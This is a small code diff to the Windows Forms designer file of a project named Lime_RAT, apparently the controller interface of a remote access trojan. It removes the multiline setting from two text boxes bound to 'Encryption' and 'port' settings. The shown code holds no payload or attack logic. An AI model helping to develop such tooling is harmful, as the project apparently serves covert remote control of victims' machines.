@@ -68,7 +68,6 @@ Partial Class Intro
         Me.MetroTextBox2.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Lime_RAT.My.MySettings.Default, "Encryption", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
         Me.MetroTextBox2.FontSize = MetroFramework.MetroTextBoxSize.Medium
         Me.MetroTextBox2.Location = New System.Drawing.Point(130, 98)
-        Me.MetroTextBox2.Multiline = True
         Me.MetroTextBox2.Name = "MetroTextBox2"
         Me.MetroTextBox2.Size = New System.Drawing.Size(230, 36)
         Me.MetroTextBox2.Style = MetroFramework.MetroColorStyle.Lime
@@ -114,7 +113,6 @@ Partial Class Intro
         Me.MetroTextBox1.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Lime_RAT.My.MySettings.Default, "port", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
         Me.MetroTextBox1.FontSize = MetroFramework.MetroTextBoxSize.Medium
         Me.MetroTextBox1.Location = New System.Drawing.Point(130, 29)
-        Me.MetroTextBox1.Multiline = True
         Me.MetroTextBox1.Name = "MetroTextBox1"
         Me.MetroTextBox1.Size = New System.Drawing.Size(97, 36)
         Me.MetroTextBox1.Style = MetroFramework.MetroColorStyle.Lime
